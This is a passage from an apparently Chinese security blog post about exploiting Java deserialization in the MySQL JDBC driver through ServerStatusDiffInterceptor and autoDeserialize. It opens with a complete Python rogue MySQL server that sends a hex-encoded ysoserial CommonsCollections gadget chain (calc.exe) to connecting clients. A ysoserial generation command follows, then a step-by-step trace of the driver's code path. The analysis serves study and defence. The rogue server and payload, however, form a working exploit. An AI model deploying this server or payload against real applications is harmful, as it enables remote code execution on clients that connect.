</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">send_data</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span><span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Sending the package : </span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">binascii</span><span class="o">.</span><span class="n">a2b_hex</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_payload_content</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#file文件的内容使用ysoserial生成的 使用规则：java -jar ysoserial [Gadget] [command] &gt; payload</span>
</span></span><span class="line"><span class="cl">    <span class="n">file</span><span class="o">=</span> <span class="sa">r</span><span class="s1">&#39;C:</span><span class="se">\\</span><span class="s1">Users</span><span class="se">\\</span><span class="s1">jie</span><span class="se">\\</span><span class="s1">Desktop</span><span class="se">\\</span><span class="s1">learn</span><span class="se">\\</span><span class="s1">java</span><span class="se">\\</span><span class="s1">TOOLS</span><span class="se">\\</span><span class="s1">ser.bin&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">file</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">payload_content</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">binascii</span><span class="o">.</span><span class="n">b2a_hex</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()),</span><span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;open successs&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;open false&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#calc</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload_content</span><span class="o">=</span><span class="s1">&#39;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">payload_content</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 主要逻辑</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">run</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">conn</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">sk</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Connection come from </span><span class="si">{}</span><span class="s2">:</span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">addr</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="n">addr</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># 1.先发送第一个 问候报文</span>
</span></span><span class="line"><span class="cl">        <span class="n">send_data</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span><span class="n">greeting_data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok</span>
</span></span><span class="line"><span class="cl">            <span class="n">receive_data</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">send_data</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span><span class="n">response_ok_data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">#其他过程</span>
</span></span><span class="line"><span class="cl">            <span class="n">data</span><span class="o">=</span><span class="n">receive_data</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="c1">#查询一些配置信息,其中会发送自己的 版本号</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s2">&#34;session.auto_increment_increment&#34;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">_payload</span><span class="o">=</span><span class="s1">&#39;01000001112e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c21000c000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c21002d000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c21002a000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000001e00000e036465660000000873716c5f6d6f6465000c21005f010000fd00001f00002600000f036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000010036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001103646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000012036465660000000c776169745f74696d656f7574000c3f001500000008a000000000e9000013013104757466380475746638047574663804757466380f757466385f756e69636f64655f63690e534554204e414d45532075746638033132300347504c0131083136373737323136023630754f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d524541440331323007000014fe000002000000&#39;</span>
</span></span><span class="line"><span class="cl">                <span class="n">send_data</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span><span class="n">_payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">data</span><span class="o">=</span><span class="n">receive_data</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="s2">&#34;show warnings&#34;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">_payload</span> <span class="o">=</span> <span class="s1">&#39;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#39;</span>
</span></span><span class="line"><span class="cl">                <span class="n">send_data</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">_payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">data</span> <span class="o">=</span> <span class="n">receive_data</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s2">&#34;set names&#34;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">send_data</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">response_ok_data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">data</span> <span class="o">=</span> <span class="n">receive_data</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s2">&#34;set character_set_results&#34;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">send_data</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">response_ok_data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">data</span> <span class="o">=</span> <span class="n">receive_data</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s2">&#34;session.autocommit&#34;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">autocommit_result</span><span class="o">=</span><span class="s1">&#39;01000001012a0000020364656600000014404073657373696f6e2e6175746f636f6d6d6974000c3f000100000008800000000002000003013107000004fe000002000000&#39;</span>
</span></span><span class="line"><span class="cl">                <span class="n">send_data</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">autocommit_result</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">data</span> <span class="o">=</span> <span class="n">receive_data</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s2">&#34;show session status&#34;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">mysql_data</span><span class="o">=</span><span class="s1">&#39;0100000102360000020364656604746573740c6a6176615f6f626a656374730c6a6176615f6f626a656374730269640269640c3f000b000000030342000000540000030364656604746573740c6a6176615f6f626a656374730c6a6176615f6f626a656374731173657269616c697a65645f6f626a6563741173657269616c697a65645f6f626a6563740c3f00ffff0000fc9000000000060500040131fc0105aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000863616c632e657865740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f400000000000007708000000100000000078787807000005fe000002000000&#39;</span>
</span></span><span class="line"><span class="cl">                <span class="c1">#mysql_data是测试 返回SHOW SESSION STATUS结果 的原始数据流</span>
</span></span><span class="line"><span class="cl">                <span class="n">payload_content</span><span class="o">=</span><span class="n">get_payload_content</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                <span class="n">payload_length</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload_content</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span><span class="p">))</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">payload_length_hex</span> <span class="o">=</span> <span class="n">payload_length</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="n">payload_length</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">2</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">                <span class="n">data_len</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload_content</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span> <span class="o">+</span> <span class="mi">5</span><span class="p">))</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">data_len_hex</span> <span class="o">=</span> <span class="n">data_len</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="n">data_len</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">2</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="n">mysql_data2</span><span class="o">=</span><span class="s1">&#39;0100000102360000020364656604746573740c6a6176615f6f626a656374730c6a6176615f6f626a656374730269640269640c3f000b000000030342000000540000030364656604746573740c6a6176615f6f626a656374730c6a6176615f6f626a656374731173657269616c697a65645f6f626a6563741173657269616c697a65645f6f626a6563740c3f00ffff0000fc9000000000&#39;</span>
</span></span><span class="line"><span class="cl">                <span class="n">mysql_data2</span><span class="o">=</span><span class="n">mysql_data2</span><span class="o">+</span><span class="n">data_len_hex</span><span class="o">+</span><span class="s1">&#39;0004&#39;</span><span class="o">+</span><span class="s1">&#39;0131&#39;</span><span class="o">+</span><span class="s1">&#39;fc&#39;</span><span class="o">+</span><span class="n">payload_length_hex</span><span class="o">+</span><span class="n">payload_content</span>
</span></span><span class="line"><span class="cl">                <span class="n">mysql_data2</span><span class="o">+=</span><span class="s1">&#39;07000005fe000002000000&#39;</span>
</span></span><span class="line"><span class="cl">                
</span></span><span class="line"><span class="cl">                <span class="n">send_data</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">mysql_data2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">data</span> <span class="o">=</span> <span class="n">receive_data</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s2">&#34;show warnings&#34;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#39;</span>
</span></span><span class="line"><span class="cl">                <span class="n">send_data</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">HOST</span> <span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">PORT</span> <span class="o">=</span> <span class="mi">3307</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">sk</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间</span>
</span></span><span class="line"><span class="cl">    <span class="n">sk</span><span class="o">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sk</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">sk</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;start fake mysql server listening on </span><span class="si">{}</span><span class="s2">:</span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span><span class="n">PORT</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">run</span><span class="p">()</span>
</span></span></code></pre></div><p>● 编写反序列化的恶意数据到文件 <code>ser.bin</code> 中</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">java -jar ysoserial.jar CommonsCollections6 calc.exe &gt; ser.bin
</span></span></code></pre></div><h2 id="0x01-分析">0x01 分析<a hidden class="anchor" aria-hidden="true" href="#0x01-分析">#</a></h2>
<h3 id="queryinterceptors">queryInterceptors<a hidden class="anchor" aria-hidden="true" href="#queryinterceptors">#</a></h3>
<p>这里我想先反着来，先理解poc中这个设置<code>ServerStatusDiffInterceptor</code>，为什么设置这个</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor
</span></span></code></pre></div><p>我们知道mysql打的是反序列化，前辈挖可能也是根据readObject定位。</p>
<p><img loading="lazy" src="images/image-20250213195332829.png" alt="image-20250213195332829"  />
</p>
<p>根据<code>getObject</code>往上则找到<code>ServerStatusDiffInterceptor</code>这个类</p>
<p><img loading="lazy" src="images/image-20250213195727142.png" alt="image-20250213195727142"  />
</p>
<p>我们后面再说这个咋调用的。</p>
<h3 id="开头">开头<a hidden class="anchor" aria-hidden="true" href="#开头">#</a></h3>
<p>现在我从<code>DriverManager.getConnection</code>开始调试分析整个流程！（中间部分调试，我觉得沉余就省略了</p>
<p>这里直接到<code>ConnectionUrl.getConnectionUrlInstance</code>这个地方会对我们传入的<code>url(JDBC_Url)</code>进行分类封装。</p>
<p><img loading="lazy" src="images/image-20250212153612502.png" alt="image-20250212153612502"  />
</p>
<p>然后到<code>ConnectionImpl</code>，这里会初始化我们设置的<code>queryInterceptors</code>值，<code>o.init</code>会调用<code>ServerStatusDiffInterceptor#init</code></p>
<p>然后包装成一个<code>Arraylist</code>存储到<code>this.queryInterceptors</code>中</p>
<p><img loading="lazy" src="images/image-20250213200557116.png" alt="image-20250213200557116"  />
</p>
<p>然后client端这边想执行一个<code>SET autocommit=1</code>语句</p>
<p><img loading="lazy" src="images/image-20250213201229427.png" alt="image-20250213201229427"  />
</p>
<p>然后我们看后面是怎么执行的</p>
<p><code>NativeProtocol#sendQueryPacket</code></p>
<p>这里发现会判断是否有设置<code>queryInterceptors</code>拦截器，有的话会通过这个拦截器完成<code>执行SET autocommit=1</code>这个任务(没有的话，就直接发送这个请求给mysql服务器，执行这条sql语句并返回值)</p>
<p><img loading="lazy" src="images/image-20250213201354764.png" alt="image-20250213201354764"  />
</p>
<p>然后一路到调用这个拦截器的<code>preProcess()</code>方法</p>
<p><img loading="lazy" src="images/image-20250213202402683.png" alt="image-20250213202402683"  />
</p>
<p>而<code>ServerStatusDiffInterceptor#preProcess</code>正是调用<code>populateMapWithSessionStatusValues()</code>方法，于是利用点也就穿起来了</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="o">&lt;</span><span class="n">T</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">Resultset</span><span class="o">&gt;</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="nf">preProcess</span><span class="p">(</span><span class="n">Supplier</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">sql</span><span class="p">,</span><span class="w"> </span><span class="n">Query</span><span class="w"> </span><span class="n">interceptedQuery</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">populateMapWithSessionStatusValues</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">preExecuteValues</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w"> </span><span class="c1">// we don&#39;t actually modify a result set</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>本来是要执行<code>SET autocommit=1</code>，结果<code>ServerStatusDiffInterceptor</code>转头执行了个<code>SHOW SESSION STATUS</code>，并处理这个返回的结果（利用点也出在）</p>
<p><img loading="lazy" src="images/image-20250212160929676.png" alt="image-20250212160929676"  />
</p>
<p>SHOW SESSION STATUS 执行结果</p>
<p><img loading="lazy" src="images/image-20250213203454758.png" alt="image-20250213203454758"  />
</p>
<p>SHOW SESSION STATUS 执行结果其实也就是相当于<code>select * from table(table是两个字段的)</code></p>
<p>下面<code>rs.getObject(1), rs.getObject(2)</code>就是获取<code>第一个字段，第二个字段</code></p>
<p><img loading="lazy" src="images/image-20250212160942856.png" alt="image-20250212160942856"  />
</p>
<h3 id="autodeserialize">autoDeserialize<a hidden class="anchor" aria-hidden="true" href="#autodeserialize">#</a></h3>
<p>然后就到了最终利用点，这里数据类型得是<code>BLOB</code>，然后这里也是为什么要设置<code>autoDeserialize</code>(true可以用1绕过)，其实<code>BIT</code>类型也有readobject，但是我搜索的时候bit长度不能太长(这个没去验证)，但是序列化数据是需要长度的，所以这里用BLOB</p>
<p><img loading="lazy" src="images/image-20250213203804258.png" alt="image-20250213203804258"  />
</p>
<p>上述就是调试的整个流程</p>
<h2 id="0x02-mysql恶意服务构造">0x02 mysql恶意服务构造<a hidden class="anchor" aria-hidden="true" href="#0x02-mysql恶意服务构造">#</a></h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">mysql</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.sql.Connection</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.sql.DriverManager</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.sql.ResultSet</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.sql.Statement</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">contect_test</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">
